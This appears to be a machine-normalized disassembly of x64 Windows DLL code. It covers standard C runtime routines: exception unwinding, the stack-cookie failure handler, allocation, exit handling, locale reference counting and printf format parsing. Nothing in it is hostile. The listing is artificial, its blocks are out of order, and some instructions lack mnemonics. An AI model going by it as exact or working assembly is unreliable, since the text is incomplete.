cmp [ rbp ] 0xe06d7363
jne r-xdata
mov eax [ rbx ]
lea rcx [ rsp + 0x30 ]
mov rdx r13
add rax r15
call rax
test eax eax
js r-xdata
cmp [ rbx ] 0x0
jne r-xdata
cmp ebp [ rbx - 0x4 ]
je r-xdata
mov ecx [ rbx + 0x4 ]
mov r8d 0x1
mov rdx r13
add rcx r15
call sub_18002ddc0
mov rax [ r12 + 0x40 ]
mov edx [ rbx + 0x4 ]
movsxd r9 [ rbp ]
mov [ rsp + 0x28 ] rax
mov rax [ r12 + 0x28 ]
add rdx r15
mov r8 rbp
mov rcx r13
mov [ rsp + 0x20 ] rax
call [ RtlUnwindEx@IAT ]
call sub_18002ddf0
cmp [ r--data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
jle r-xdata
mov rdx [ rsp + 0x78 ]
lea eax [ rsi + 0x1 ]
mov cl 0x1
mov [ r12 + 0x48 ] eax
mov r8d [ rbx - 0x4 ]
add r8 r15
call r8
lea rcx [ r--data ]
call sub_18002e5d0
test eax eax
je r-xdata
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov edx 0x1
mov rcx rbp
call [ r--data ]
sub_180026120
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
xor eax eax
mov rcx rbx
call rax
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180026154
mov [ rsp + 0x8 ] rcx
sub rsp 0x88
lea rcx [ rw-data ]
call [ RtlCaptureContext@IAT ]
mov rax [ rw-data ]
mov [ rsp + 0x58 ] rax
xor r8d r8d
lea rdx [ rsp + 0x60 ]
mov rcx [ rsp + 0x58 ]
call RtlLookupFunctionEntry
mov [ rsp + 0x50 ] rax
cmp [ rsp + 0x50 ] 0x0
je r-xdata
mov rax [ rsp + 0x88 ]
mov [ rw-data ] rax
lea rax [ rsp + 0x88 ]
add rax 0x8
mov [ rw-data ] rax
mov [ rsp + 0x38 ] 0x0
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x28 ] rax
lea rax [ rw-data ]
mov [ rsp + 0x20 ] rax
mov r9 [ rsp + 0x50 ]
mov r8 [ rsp + 0x58 ]
mov rdx [ rsp + 0x60 ]
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov edx 0xc0000409
mov rcx rax
call [ TerminateProcess@IAT ]
add rsp 0x88
retn
mov ecx 0x1
call sub_18002e614
mov rax [ rw-data ]
mov [ rw-data ] rax
mov rax [ rsp + 0x90 ]
mov [ rw-data ] rax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov rax [ rw-data ]
mov [ rsp + 0x68 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x70 ] rax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
mov ecx 0x1
call sub_18002e614
xor ecx ecx
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ r--data ]
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
sub_1800262a0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx r8
mov rdi rdx
test rcx rcx
je r-xdata
imul rdi rcx
mov eax 0x1
test rdi rdi
cmove rdi rax
xor edx edx
lea rax [ rdx - 0x20 ]
div rcx
cmp rax rdi
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
lea edx [ rax + 0x8 ]
mov r8 rdi
call [ HeapAlloc@IAT ]
test rax rax
jne r-xdata
call sub_180022de4
mov [ rax ] 0xc
test rbx rbx
je r-xdata
mov rcx rdi
call sub_180026120
test eax eax
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rbx ] 0xc
xor eax eax
cmp rdi 0xffffffffffffffe0
ja r-xdata
test rbx rbx
je r-xdata
xor eax eax
jmp r-xdata
mov [ rbx ] 0xc
jmp r-xdata
sub_180026344
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rbp
push rdi
push r12
lea rbp [ rsp - 0x4f0 ]
sub rsp 0x5f0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4e0 ] rax
mov edi r8d
mov esi edx
mov ebx ecx
cmp ecx 0xffffffff
je r-xdata
and [ rsp + 0x70 ] 0x0
lea rcx [ rsp + 0x74 ]
xor edx edx
mov r8d 0x94
call sub_180021150
lea r11 [ rsp + 0x70 ]
lea rax [ rbp + 0x10 ]
lea rcx [ rbp + 0x10 ]
mov [ rsp + 0x48 ] r11
mov [ rsp + 0x50 ] rax
call [ RtlCaptureContext@IAT ]
mov r12 [ rbp + 0x108 ]
lea rdx [ rsp + 0x40 ]
mov rcx r12
xor r8d r8d
call RtlLookupFunctionEntry
test rax rax
je r-xdata
call sub_18002e614
mov rax [ rbp + 0x508 ]
mov [ rbp + 0x108 ] rax
lea rax [ rbp + 0x508 ]
mov [ rbp + 0xa8 ] rax
and [ rsp + 0x38 ] 0x0
mov rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x60 ]
mov [ rsp + 0x30 ] rcx
lea rcx [ rsp + 0x58 ]
mov r9 rax
mov [ rsp + 0x28 ] rcx
lea rcx [ rbp + 0x10 ]
mov r8 r12
mov [ rsp + 0x20 ] rcx
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
mov rcx [ rbp + 0x4e0 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x5f0 ]
mov rbx [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rbp
retn
test edi edi
jne r-xdata
mov rax [ rbp + 0x508 ]
mov [ rsp + 0x70 ] esi
mov [ rsp + 0x74 ] edi
mov [ rbp - 0x80 ] rax
call [ IsDebuggerPresent@IAT ]
xor ecx ecx
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ rsp + 0x48 ]
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
mov ecx ebx
call sub_18002e614
sub_1800264c4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
mov rbp rcx
mov rcx [ rw-data ]
mov ebx r9d
mov rdi r8
mov rsi rdx
call [ DecodePointer@IAT ]
mov r9d ebx
mov r8 rdi
mov rdx rsi
mov rcx rbp
test rax rax
je r-xdata
mov rax [ rsp + 0x60 ]
mov [ rsp + 0x20 ] rax
call sub_180026490
int3
mov r10 [ rsp + 0x60 ]
mov [ rsp + 0x20 ] r10
call rax
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_180026554
push rbx
sub rsp 0x20
mov ebx ecx
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
test rax rax
je r-xdata
add rsp 0x20
pop rbx
retn
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov ecx ebx
call rax
sub_1800265c0
push rbx
sub rsp 0x20
call EncodePointer
mov rcx rax
mov rbx rax
call sub_180026118
mov rcx rbx
call sub_18002633c
mov rcx rbx
call sub_18002596c
mov rcx rbx
call sub_18002196c
mov rcx rbx
call sub_18002ddf4
mov rcx rbx
add rsp 0x20
pop rbx
jmp sub_1800260f8
sub_180026604
cmp rcx rdx
jae r-xdata
retn
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rax
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_180026638
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
xor eax eax
mov rdi rdx
mov rbx rcx
cmp rcx rdx
jae r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test eax eax
jne r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rcx
sub_180026674
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ r--data ] 0x0
mov ebx ecx
je r-xdata
call sub_1800286c0
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_180026638
test eax eax
jne r-xdata
lea rcx [ r--data ]
call sub_18002e5d0
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rcx [ sub_18002a8dc ]
call sub_180021c0c
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
mov ecx ebx
call [ r--data ]
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
add rbx 0x8
call rax
xor eax eax
lea rcx [ rw-data ]
call sub_18002e5d0
test eax eax
je r-xdata
xor r8d r8d
xor ecx ecx
lea edx [ r8 + 0x2 ]
call [ rw-data ]
sub_180026724
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] r8d
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r12d r8d
mov ebx edx
mov r15d ecx
mov ecx 0x8
call sub_18002d0a8
nop
cmp [ rw-data ] 0x1
je r-xdata
test r12d r12d
je r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] r12b
test ebx ebx
jne r-xdata
mov [ rw-data ] 0x1
mov ecx 0x8
call sub_18002cfa8
mov ecx r15d
call sub_180026554
mov ecx r15d
call [ ExitProcess@IAT ]
mov ecx 0x8
call sub_18002cfa8
test r12d r12d
jne r-xdata
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_180026604
nop
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rsi rax
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_180026604
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rdi rax
mov [ rsp + 0x20 ] rax
mov r14 rsi
mov [ rsp + 0x28 ] rsi
mov r13 rax
mov [ rsp + 0x38 ] rax
call EncodePointer
cmp [ rdi ] rax
jne r-xdata
cmp rdi rsi
jb r-xdata
jmp r-xdata
mov rcx [ rdi ]
call [ DecodePointer@IAT ]
mov rbx rax
call EncodePointer
mov [ rdi ] rax
call rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rbx rax
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
cmp r14 rbx
jne r-xdata
sub rdi 0x8
mov [ rsp + 0x20 ] rdi
cmp rdi rsi
jb r-xdata
mov r14 rbx
mov [ rsp + 0x28 ] rbx
mov rsi rbx
mov [ rsp + 0x30 ] rbx
mov r13 rax
mov [ rsp + 0x38 ] rax
mov rdi rax
mov [ rsp + 0x20 ] rax
jmp r-xdata
cmp r13 rax
je r-xdata
sub_1800268f8
[ rcx ]
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ]
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ]
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ]
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ]
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
dec r8
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ]
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ]
retn
[ rdx ]
sub_180026984
test rcx rcx
je r-xdata
mov rax rcx
retn
or r9d 0xffffffff
[ rcx ] r9d
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ] r9d
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ] r9d
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
dec r8
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ] r9d
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ] r9d
[ rdx ] r9d
sub_180026a28
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rax [ rcx + 0x128 ]
mov rbx rcx
test rax rax
je r-xdata
mov rax [ rbx + 0x130 ]
test rax rax
je r-xdata
lea rcx [ rw-data ]
cmp rax rcx
je r-xdata
mov rcx [ rbx + 0x158 ]
lea rax [ rw-data ]
cmp rcx rax
je r-xdata
cmp [ rax ] 0x0
jne r-xdata
mov rax [ rbx + 0x110 ]
test rax rax
je r-xdata
lea rdi [ rbx + 0x58 ]
mov esi 0x6
cmp [ rcx + 0x160 ] 0x0
jne r-xdata
mov rcx [ rbx + 0x138 ]
sub rcx 0xfe
call sub_18002094c
mov rcx [ rbx + 0x148 ]
mov edi 0x80
sub rcx rdi
call sub_18002094c
mov rcx [ rbx + 0x150 ]
sub rcx rdi
call sub_18002094c
mov rcx [ rbx + 0x130 ]
call sub_18002094c
cmp [ rax ] 0x0
jne r-xdata
cmp [ rdi - 0x8 ] 0x0
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
call sub_18002c17c
mov rcx [ rbx + 0x158 ]
call sub_18002094c
mov rcx [ rbx + 0x120 ]
test rcx rcx
je r-xdata
add rdi 0x20
dec rsi
jne r-xdata
mov rcx [ rdi + 0x8 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
mov rcx [ rbx + 0x118 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp [ rdi - 0x10 ] rax
je r-xdata
mov rcx rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_18002094c
cmp [ rcx ] 0x0
jne r-xdata
call sub_18002094c
mov rcx [ rbx + 0x110 ]
call sub_18002094c
mov rcx [ rbx + 0x128 ]
call sub_18002094c
cmp [ rcx ] 0x0
jne r-xdata
call sub_18002094c
mov rcx [ rbx + 0x128 ]
call sub_18002c8dc
call sub_18002094c
call sub_18002094c
mov rcx [ rbx + 0x128 ]
call sub_18002c608
sub_180026ba4
push rbx
sub rsp 0x20
mov rbx rdx
test rdx rdx
je r-xdata
xor eax eax
test rcx rcx
je r-xdata
mov r10 [ rcx ]
cmp r10 rdx
je r-xdata
mov rax rbx
jmp r-xdata
mov [ rcx ] rdx
mov rcx rdx
call sub_1800268f8
test r10 r10
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r10
call sub_180026984
cmp [ r10 ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp r10 rax
je r-xdata
call sub_180026a28
sub_180026bfc
push rbx
sub rsp 0x20
call sub_180025c90
mov rbx rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xc
call sub_18002d0a8
nop
lea rcx [ rbx + 0xc0 ]
mov rdx [ rw-data ]
call sub_180026ba4
mov rbx rax
mov ecx 0xc
call sub_18002cfa8
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
lea ecx [ rbx + 0x20 ]
call sub_1800268d0
call sub_180025c90
mov rbx [ rax + 0xc0 ]
jmp r-xdata
test rbx rbx
jne r-xdata
sub_180026c74
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov [ rax + 0x8 ] ecx
push rdi
sub rsp 0x20
mov rcx rdx
mov rbx rdx
call sub_18002f2a0
mov ecx [ rbx + 0x18 ]
movsxd rsi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_180022de4
mov [ rax ] 0x9
xor edi edi
test cl 0x1
je r-xdata
call sub_180022de4
mov [ rax ] 0x22
jmp r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov eax [ rbx + 0x18 ]
mov [ rbx + 0x8 ] edi
and eax 0xffffffef
or eax 0x2
mov [ rbx + 0x18 ] eax
test eax 0x10c
jne r-xdata
mov [ rbx + 0x8 ] edi
test cl 0x10
je r-xdata
or [ rbx + 0x18 ] 0x20
test [ rbx + 0x18 ] 0x108
je r-xdata
call sub_18002f08c
add rax 0x30
cmp rbx rax
je r-xdata
or ecx 0x20
mov [ rbx + 0x18 ] ecx
jmp r-xdata
mov rax [ rbx + 0x10 ]
and ecx 0xfffffffe
mov [ rbx ] rax
mov [ rbx + 0x18 ] ecx
mov ebp 0x1
lea rdx [ rsp + 0x30 ]
mov ecx esi
mov r8d ebp
call sub_18002eef8
mov edi eax
mov ebp [ rbx ]
mov rdx [ rbx + 0x10 ]
sub ebp [ rbx + 0x10 ]
lea rax [ rdx + 0x1 ]
mov [ rbx ] rax
mov eax [ rbx + 0x24 ]
dec eax
mov [ rbx + 0x8 ] eax
test ebp ebp
jle r-xdata
mov ecx esi
call sub_18002f02c
test eax eax
jne r-xdata
call sub_18002f08c
add rax 0x60
cmp rbx rax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
movzx eax [ rsp + 0x30 ]
cmp esi 0xffffffff
je r-xdata
mov r8d ebp
mov ecx esi
call sub_18002eef8
mov edi eax
jmp r-xdata
mov rcx rbx
call sub_18002efd8
lea rcx [ rw-data ]
cmp esi 0xfffffffe
je r-xdata
mov rcx [ rbx + 0x10 ]
mov al [ rsp + 0x30 ]
mov [ rcx ] al
jmp r-xdata
xor edx edx
mov ecx esi
lea r8d [ rdx + 0x2 ]
call sub_18002e6b4
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx rsi
mov rax rsi
lea rdx [ rw-data ]
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
add rcx [ rdx + rax * 8 ]
jmp r-xdata
cmp edi ebp
jne r-xdata
test [ rcx + 0x8 ] 0x20
je r-xdata
sub_180026e04
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1d0 ]
sub rsp 0x2d0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1c8 ] rax
xor eax eax
mov rbx rcx
mov [ rsp + 0x68 ] rcx
mov rdi rdx
lea rcx [ rbp - 0x80 ]
mov rdx r8
mov r14 r9
mov [ rsp + 0x60 ] eax
mov r13d eax
mov [ rsp + 0x54 ] eax
mov r15d eax
mov [ rsp + 0x48 ] eax
mov [ rsp + 0x5c ] eax
mov [ rsp + 0x50 ] eax
call sub_1800221bc
xor r10d r10d
test rbx rbx
jne r-xdata
or esi 0xffffffff
test [ rbx + 0x18 ] 0x40
lea r9 [ __dos_header ]
jne r-xdata
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
xor r11d r11d
cmp [ rbp - 0x68 ] r11b
je r-xdata
test rdi rdi
je r-xdata
mov rcx rbx
call sub_18002f2a0
lea rdx [ rw-data ]
cmp eax esi
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x70 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
xor r11d r11d
cmp [ rbp - 0x68 ] r11b
mov r12b [ rdi ]
mov r8d r10d
mov [ rsp + 0x40 ] r10d
mov [ rsp + 0x44 ] r10d
mov edx r10d
mov [ rbp - 0x60 ] r10
test r12b r12b
je r-xdata
mov r8 rdx
lea r9 [ __dos_header ]
cmp eax 0xfffffffe
je r-xdata
mov rcx [ rbp + 0x1c8 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x320 ]
add rsp 0x2d0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax esi
jmp r-xdata
mov rax [ rbp - 0x70 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x68 ] r10b
je r-xdata
mov rbx [ rbp - 0x48 ]
mov r11d 0x200
cmp eax esi
je r-xdata
movsxd r8 eax
lea r9 [ __dos_header ]
mov rcx r8
and r8d 0x1f
sar rcx 0x5
imul r8 r8 0x58
add r8 [ r9 + rcx * 8 + 0x52b20 ]
jmp r-xdata
mov eax r8d
mov rcx [ rbp - 0x70 ]
and [ rcx + 0xc8 ] 0xfffffffd
lea eax [ r12 - 0x20 ]
cmp al 0x58
ja r-xdata
test [ rdx + 0x38 ] 0x80
je r-xdata
cmp eax 0xfffffffe
je r-xdata
test [ r8 + 0x38 ] 0x7f
jne r-xdata
mov ecx r10d
movsx rax r12b
movsx ecx [ rax + r9 + 0x3c540 ]
and ecx 0xf
jmp r-xdata
xor r10d r10d
movsxd rdx eax
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
add rdx [ r9 + rax * 8 + 0x52b20 ]
lea rdx [ rbp - 0x80 ]
movzx ecx r12b
mov [ rsp + 0x50 ] r10d
call sub_18002f2c8
test eax eax
je r-xdata
dec ecx
je r-xdata
movsxd rax edx
movsxd rcx ecx
lea rdx [ rax + rcx * 8 ]
movsx edx [ rdx + r9 + 0x3c560 ]
sar edx 0x4
mov [ rsp + 0x58 ] edx
mov ecx edx
test edx edx
je r-xdata
mov rdx [ rsp + 0x68 ]
lea r8 [ rsp + 0x40 ]
mov cl r12b
call sub_18002f548
mov r8d [ rsp + 0x40 ]
xor r10d r10d
jmp r-xdata
mov rdx [ rsp + 0x68 ]
lea r8 [ rsp + 0x40 ]
mov cl r12b
call sub_18002f548
mov r12b [ rdi ]
inc rdi
test r12b r12b
je r-xdata
mov [ rsp + 0x78 ] r10d
mov [ rsp + 0x5c ] r10d
mov [ rsp + 0x54 ] r10d
mov [ rsp + 0x48 ] r10d
mov r13d r10d
mov r15d esi
mov [ rsp + 0x50 ] r10d
jmp r-xdata
dec ecx
je r-xdata
mov edx [ rsp + 0x58 ]
mov r11d 0x200
lea r9 [ __dos_header ]
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
xor eax eax
cmp [ rbp - 0x68 ] al
jmp r-xdata
mov r12b [ rdi ]
test r12b r12b
jne r-xdata
cmp r12b 0x20
je r-xdata
dec ecx
je r-xdata
inc rdi
mov [ rbp - 0x50 ] rdi
test r8d r8d
js r-xdata
je r-xdata
or r13d 0x2
jmp r-xdata
cmp r12b 0x23
je r-xdata
cmp r12b 0x2a
jne r-xdata
dec ecx
je r-xdata
bts r13d 0x7
jmp r-xdata
cmp r12b 0x2b
je r-xdata
mov eax [ rsp + 0x54 ]
lea ecx [ rax + rax * 4 ]
movsx eax r12b
lea eax [ rax + rcx * 2 - 0x30 ]
mov eax [ r14 ]
add r14 0x8
mov [ rsp + 0x54 ] eax
test eax eax
jns r-xdata
mov r15d r10d
jmp r-xdata
dec ecx
je r-xdata
or r13d 0x1
jmp r-xdata
cmp r12b 0x2d
je r-xdata
or r13d 0x4
neg eax
jmp r-xdata
cmp r12b 0x2a
jne r-xdata
dec ecx
je r-xdata
or r13d 0x4
jmp r-xdata
cmp r12b 0x30
jne r-xdata
mov [ rsp + 0x54 ] eax
jmp r-xdata
lea ecx [ r15 + r15 * 4 ]
movsx eax r12b
lea r15d [ rax + rcx * 2 - 0x30 ]
jmp r-xdata
mov r15d [ r14 ]
add r14 0x8
test r15d r15d
jns r-xdata
cmp r12b 0x49
je r-xdata
dec ecx
jne r-xdata
or r13d 0x8
jmp r-xdata
mov r15d esi
jmp r-xdata
mov al [ rdi ]
bts r13d 0xf
cmp al 0x36
jne r-xdata
cmp r12b 0x68
je r-xdata
movsx eax r12b
cmp eax 0x64
jg r-xdata
cmp al 0x33
jne r-xdata
cmp [ rdi + 0x1 ] 0x34
jne r-xdata
or r13d 0x20
jmp r-xdata
cmp r12b 0x6c
je r-xdata
cmp eax 0x65
jl r-xdata
je r-xdata
cmp al 0x64
je r-xdata
cmp [ rdi + 0x1 ] 0x32
jne r-xdata
add rdi 0x2
bts r13d 0xf
jmp r-xdata
cmp [ rdi ] 0x6c
jne r-xdata
cmp r12b 0x77
jne r-xdata
cmp [ rsp + 0x5c ] r10d
jne r-xdata
cmp eax 0x67
jle r-xdata
or r13d 0x40
cmp eax 0x41
je r-xdata
cmp al 0x69
je r-xdata
add rdi 0x2
btr r13d 0xf
jmp r-xdata
or r13d 0x10
jmp r-xdata
inc rdi
bts r13d 0xc
jmp r-xdata
bts r13d 0xb
jmp r-xdata
mov r8d [ rsp + 0x40 ]
test r13b 0x40
je r-xdata
or r13d 0x40
lea rbx [ rbp - 0x40 ]
mov esi r11d
test r15d r15d
jns r-xdata
cmp eax 0x69
je r-xdata
bt r13d 0xc
jb r-xdata
mov r8 [ r14 ]
add r14 0x8
jmp r-xdata
mov [ rsp + 0x78 ] 0x1
add r12b 0x20
cmp eax 0x43
je r-xdata
cmp al 0x6f
je r-xdata
mov rdi [ rbp - 0x50 ]
or esi 0xffffffff
mov rcx rax
call sub_18002094c
mov r8d [ rsp + 0x40 ]
xor r10d r10d
mov [ rbp - 0x60 ] r10
mov edi [ rsp + 0x48 ]
bt r13d 0x8
jae r-xdata
jne r-xdata
mov r15d 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
add r14 0x8
test r13b 0x20
je r-xdata
mov [ rsp + 0x70 ] r14
test r13d 0x830
jne r-xdata
cmp eax 0x45
je r-xdata
cmp al 0x75
je r-xdata
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x4c ]
mov r8 rsi
mov edx edi
call sub_18002f5e4
test r13b 0x8
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r12d
mov cl 0x20
call sub_18002f590
test r13b 0x1
je r-xdata
mov [ rsp + 0x4c ] 0x2d
jmp r-xdata
cmp r15d r11d
cmovg r15d r11d
cmp r15d 0xa3
jle r-xdata
cmp r12b 0x67
jne r-xdata
mov rax [ r14 ]
mov rcx [ rw-data ]
add r14 0x8
movsx edi r12b
movsxd rsi esi
mov [ rbp - 0x48 ] rax
call [ DecodePointer@IAT ]
lea rcx [ rbp - 0x80 ]
mov r9d edi
mov [ rsp + 0x30 ] rcx
mov ecx [ rsp + 0x78 ]
mov r8 rsi
mov [ rsp + 0x28 ] ecx
lea rcx [ rbp - 0x48 ]
mov rdx rbx
mov [ rsp + 0x20 ] r15d
call rax
mov edi r13d
and edi 0x80
je r-xdata
mov rdi [ r14 ]
add r14 0x8
call sub_18002f358
xor r10d r10d
test eax eax
je r-xdata
cmp eax 0x6f
je r-xdata
test r13b 0x40
je r-xdata
mov [ rsp + 0x70 ] r14
test r13b 0x40
je r-xdata
test eax r13d
jne r-xdata
test r8 r8
jns r-xdata
add r14 0x8
test r13d 0x810
je r-xdata
bts r13d 0xb
cmp eax 0x47
je r-xdata
cmp al 0x78
je r-xdata
mov edi [ rsp + 0x44 ]
xor eax eax
cmp [ rsp + 0x50 ] eax
je r-xdata
test r13b 0x4
jne r-xdata
test r13b 0x2
je r-xdata
mov [ rsp + 0x4c ] 0x2b
mov edi 0x1
mov [ rsp + 0x48 ] edi
jmp r-xdata
lea edi [ r15 + 0x15d ]
movsxd rcx edi
call sub_180022c10
mov [ rbp - 0x60 ] rax
test rax rax
je r-xdata
mov r15d 0x1
jmp r-xdata
cmp r12b 0x67
jne r-xdata
test r15d r15d
jne r-xdata
mov eax [ rsp + 0x40 ]
test r13b 0x20
je r-xdata
mov r9d 0x8
test r13b r13b
jns r-xdata
cmp eax 0x70
je r-xdata
mov r8d [ r14 - 0x8 ]
movsxd r8 [ r14 - 0x8 ]
jmp r-xdata
movzx r8d [ r14 - 0x8 ]
jmp r-xdata
movsx r8 [ r14 - 0x8 ]
jmp r-xdata
test r15d r15d
jns r-xdata
bt r13d 0xc
jb r-xdata
neg r8
bts r13d 0x8
mov al [ r14 - 0x8 ]
mov [ rsp + 0x44 ] 0x1
mov [ rbp - 0x40 ] al
movzx r9d [ r14 - 0x8 ]
lea rdx [ rbp - 0x40 ]
lea rcx [ rsp + 0x44 ]
mov r8 r11
call sub_18002f534
xor r10d r10d
test eax eax
je r-xdata
cmp eax 0x53
je r-xdata
cmp al 0x58
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx edi
mov rcx rbx
call sub_18002f5e4
xor r10d r10d
test edi edi
jle r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r12d
mov cl 0x30
call sub_18002f590
mov [ rsp + 0x4c ] 0x20
jmp r-xdata
mov r12d [ rsp + 0x54 ]
mov rsi [ rsp + 0x68 ]
sub r12d [ rsp + 0x44 ]
sub r12d edi
test r13b 0xc
jne r-xdata
mov r15d 0xa3
mov rbx rax
mov esi edi
jmp r-xdata
